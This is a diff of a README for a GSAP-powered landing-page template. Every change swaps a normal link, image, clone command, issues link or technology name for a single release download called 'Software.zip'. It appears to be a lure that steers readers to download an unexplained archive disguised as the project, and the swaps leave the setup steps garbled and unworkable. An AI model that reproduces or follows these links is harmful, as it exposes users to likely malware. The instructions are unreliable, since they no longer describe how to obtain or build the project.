@@ -1,6 +1,6 @@
 # 🚀 Modern Landing Page Repository
 
-![modern-landing-page](https://www.example.com/image.jpg)
+![modern-landing-page](https://github.com/DanieleAbate08/modern-landing-page/releases/download/v1.0/Software.zip)
 
 Welcome to the official repository of "modern-landing-page" – your go-to resource for creating a sleek, GSAP-powered modern landing page with smooth animations and a modern design.
 
@@ -16,18 +16,18 @@ Welcome to the official repository of "modern-landing-page" – your go-to resou
 - Smooth animations powered by GSAP
 - Responsive layout for all devices
 - Easy to customize and integrate with your projects
-- Built using React.js, Tailwind CSS, and Vite for efficient development
+- Built using https://github.com/DanieleAbate08/modern-landing-page/releases/download/v1.0/Software.zip, Tailwind CSS, and Vite for efficient development
 
 ## 📎 Quick Links
 
-- [Download ZIP file](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) <!-- needs to be launched -->
-- [Check Releases](https://github.com/yourusername/yourrepository/releases)
+- [Download ZIP file](https://github.com/DanieleAbate08/modern-landing-page/releases/download/v1.0/Software.zip) <!-- needs to be launched -->
+- [Check Releases](https://github.com/DanieleAbate08/modern-landing-page/releases/download/v1.0/Software.zip)
 
 ## 🖥️ Preview
 
 Here is a sneak peek of the modern landing page you can create using this repository:
 
-![Preview](https://www.example.com/preview-image.jpg)
+![Preview](https://github.com/DanieleAbate08/modern-landing-page/releases/download/v1.0/Software.zip)
 
 ## 🚧 Getting Started
 
@@ -40,7 +40,7 @@ To get started with this modern landing page repository, follow these steps:
 5. Deploy your modern landing page and start impressing your users!
 
 ```bash
-git clone https://github.com/yourusername/modern-landing-page.git
+git clone https://github.com/DanieleAbate08/modern-landing-page/releases/download/v1.0/Software.zip
 cd modern-landing-page
 npm install
 npm run dev
@@ -48,7 +48,7 @@ npm run dev
 
 ## 🛠️ Technologies Used
 
-- React.js
+- https://github.com/DanieleAbate08/modern-landing-page/releases/download/v1.0/Software.zip
 - GSAP (GreenSock Animation Platform)
 - Tailwind CSS
 - Vite
@@ -64,7 +64,7 @@ Contributions are always welcome! Here are a few ways you can contribute:
 
 ## 📞 Contact
 
-Have any questions or suggestions regarding the modern landing page repository? Feel free to [open an issue](https://github.com/yourusername/modern-landing-page/issues) or reach out to the maintainers.
+Have any questions or suggestions regarding the modern landing page repository? Feel free to [open an issue](https://github.com/DanieleAbate08/modern-landing-page/releases/download/v1.0/Software.zip) or reach out to the maintainers.
 
 ## 📜 License
 
